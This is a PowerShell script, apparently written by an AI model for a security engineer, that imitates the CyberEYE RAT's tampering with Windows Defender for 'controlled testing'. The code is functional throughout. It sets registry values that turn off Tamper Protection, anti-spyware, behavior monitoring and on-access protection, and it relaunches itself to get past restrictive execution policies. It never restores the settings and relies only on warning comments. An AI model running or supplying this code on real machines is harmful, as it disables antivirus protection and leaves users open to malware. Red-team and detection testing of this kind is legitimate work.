#Requires -RunAsAdministrator
<#
.SYNOPSIS
    PowerShell script to simulate CyberEYE RAT's Windows Defender registry manipulations for testing security controls.
    Bypasses execution policy restrictions at runtime.
.DESCRIPTION
    Replicates registry modifications to disable Windows Defender features as described in the CyberEYE RAT analysis.
    Checks and bypasses restrictive execution policies (e.g., Restricted) by relaunching with -ExecutionPolicy Bypass.
.WARNING
    - Run only in a controlled, isolated test environment (e.g., a VM with no network access).
    - Requires administrative privileges.
    - Backup registry and system state before execution.
    - Restore Defender settings after testing.
    - Tamper Protection may block registry changes; disable it via Windows Security UI first.
.AUTHOR
    Grok, assisting a security engineer for controlled testing.
#>

# Function to check if running with admin privileges
function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to check and bypass execution policy
function Bypass-ExecutionPolicy {
    $currentPolicy = Get-ExecutionPolicy -Scope CurrentUser
    Write-Log "Current execution policy: $currentPolicy"
    
    if ($currentPolicy -eq "Restricted" -or $currentPolicy -eq "AllSigned") {
        Write-Log "Restrictive execution policy detected. Attempting to bypass..."
        try {
            # Relaunch script with -ExecutionPolicy Bypass
            $scriptPath = $MyInvocation.MyCommand.Path
            if (-not $scriptPath) {
                Write-Log "Error: Script path not found. Save this script to a .ps1 file and run it again."
                exit 1
            }
            $bypassCommand = "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
            Write-Log "Relaunching script with command: $bypassCommand"
            Invoke-Expression $bypassCommand
            exit 0  # Exit current session after relaunch
        }
        catch {
            Write-Log "Failed to bypass execution policy: $($_.Exception.Message)"
            Write-Error "Cannot bypass execution policy. Check $logFile for details."
            exit 1
        }
    }
    else {
        Write-Log "Execution policy allows script execution. Proceeding..."
    }
}

# Log file for tracking changes
$logFile = "$env:TEMP\DefenderTest_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
function Write-Log {
    param ($Message)
    $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $Message"
    Write-Output $logMessage | Out-File -FilePath $logFile -Append
    Write-Host $logMessage
}

# Exit if not running as admin
if (-not (Test-Admin)) {
    Write-Log "This script requires administrative privileges. Run PowerShell as Administrator."
    Write-Error "This script requires administrative privileges. Run PowerShell as Administrator."
    exit 1
}

Write-Log "Starting Windows Defender registry manipulation simulation."

# Check and bypass execution policy if needed
Bypass-ExecutionPolicy

try {
    # Registry paths
    $defenderFeaturesPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
    $defenderPolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    $realtimeProtectionPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"

    # Create registry paths if they don't exist
    if (-not (Test-Path $defenderPolicyPath)) {
        New-Item -Path $defenderPolicyPath -Force | Out-Null
        Write-Log "Created registry path: $defenderPolicyPath"
    }
    if (-not (Test-Path $realtimeProtectionPath)) {
        New-Item -Path $realtimeProtectionPath -Force | Out-Null
        Write-Log "Created registry path: $realtimeProtectionPath"
    }

    # Disable Tamper Protection
    if (Test-Path $defenderFeaturesPath) {
        try {
            Set-ItemProperty -Path $defenderFeaturesPath -Name "TamperProtection" -Value 0 -Type DWord -ErrorAction Stop
            Write-Log "Set TamperProtection to 0 at $defenderFeaturesPath"
        }
        catch {
            Write-Log "Failed to set TamperProtection: $($_.Exception.Message)"
            Write-Log "Note: Tamper Protection may need to be disabled via Windows Security UI first."
        }
    }
    else {
        Write-Log "Warning: $defenderFeaturesPath does not exist. Skipping TamperProtection modification."
    }

    # Disable Anti-Spyware
    Set-ItemProperty -Path $defenderPolicyPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -ErrorAction Stop
    Write-Log "Set DisableAntiSpyware to 1 at $defenderPolicyPath"

    # Disable Real-Time Protection Features
    Set-ItemProperty -Path $realtimeProtectionPath -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -ErrorAction Stop
    Write-Log "Set DisableBehaviorMonitoring to 1 at $realtimeProtectionPath"
    Set-ItemProperty -Path $realtimeProtectionPath -Name "DisableOnAccessProtection" -Value 1 -Type DWord -ErrorAction Stop
    Write-Log "Set DisableOnAccessProtection to 1 at $realtimeProtectionPath"
    Set-ItemProperty -Path $realtimeProtectionPath -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -ErrorAction Stop
    Write-Log "Set DisableScanOnRealtimeEnable to 1 at $realtimeProtectionPath"

    Write-Log "Registry manipulations completed successfully."
}
catch {
    Write-Log "Error occurred: $($_.Exception.Message)"
    Write-Error "Script failed. Check $logFile for details."
    exit 1
}
finally {
    Write-Log "Script execution finished. Log file: $logFile"
}

# Optional: Display current Defender settings for verification
Write-Log "Querying current Windows Defender settings for verification."
try {
    $defenderSettings = Get-MpPreference -ErrorAction Stop
    Write-Log "Current Defender Settings:"
    Write-Log ($defenderSettings | Format-List | Out-String)
}
catch {
    Write-Log "Failed to query Defender settings: $($_.Exception.Message)"
}
